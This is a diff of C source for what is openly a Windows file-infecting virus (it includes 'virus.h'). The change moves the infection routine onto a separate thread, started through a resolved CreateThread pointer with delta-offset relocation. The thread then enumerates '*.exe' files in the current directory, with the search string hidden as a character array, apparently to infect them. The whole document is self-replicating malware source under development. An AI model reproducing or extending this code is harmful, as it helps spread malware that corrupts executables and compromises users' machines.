@@ -1,9 +1,32 @@
 #include "virus.h"
 
-void run(void) {
-  data_t data;
+static DWORD WINAPI run(LPVOID param);
 
-  if (init_data(&data, (void*)code_begin, (void*)code_end, (uint8_t*)run - (uint8_t*)code_begin) == 0) {
+void spawn_infection_thread(void) {
+
+  data_t data;
+  if (init_data(&data, (void*)code_begin, (void*)code_end, (void*)spawn_infection_thread) == 0) {
+    HANDLE hThread = data.functions.createThread(
+      NULL,
+      0,
+      (LPTHREAD_START_ROUTINE)((uint8_t*)run + data.deltaOffset),
+      NULL,
+      0,
+      NULL
+    );
+    if (hThread == INVALID_HANDLE_VALUE) {
+      PRINT_DEBUG("could not create thread\n");
+    }
+  } else {
+    PRINT_DEBUG("failed to initialize data\n");
+  }
+}
+
+static DWORD WINAPI run(LPVOID param) {
+  data_t data;
+  PRINT_DEBUG("infection thread started\n");
+
+  if (init_data(&data, (void*)code_begin, (void*)code_end, (void*)spawn_infection_thread) == 0) {
     WIN32_FIND_DATAA findData;
     HANDLE hFind;
     const char searchPattern[8] = { '.', '/', '*', '.', 'e', 'x', 'e', 0 };
@@ -21,5 +44,9 @@ void run(void) {
       } while (data.functions.findNextFileA(hFind, &findData));
       data.functions.findClose(hFind);
     }
+  } else {
+    PRINT_DEBUG("failed to initialize data\n");
   }
+  PRINT_DEBUG("infection thread finished\n");
+  return 0;
 }
